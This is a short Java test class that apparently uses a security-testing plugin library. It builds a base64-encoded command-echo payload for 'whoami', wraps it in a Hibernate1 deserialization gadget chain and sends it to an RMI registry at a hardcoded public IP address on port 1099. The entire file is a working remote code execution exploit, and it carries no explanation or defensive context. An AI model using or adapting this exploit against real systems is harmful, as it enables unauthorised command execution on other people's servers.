import me.gv7.woodpecker.plugin.utils.CommonUtil;
import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
import sun.misc.BASE64Encoder;

public class Test {
    public static void main(String[] args) throws Exception {
        String bcelStr = CommonUtil.getEchoExeCode("whoami");
        bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
        Object objPayload = CommonUtil.generator("Hibernate1", String.format("codebase64:%s", bcelStr));
        String res = RMIRegistryExploit.sendPayload("120.76.221.115",1099, objPayload);
        System.out.println(res);

    }
}
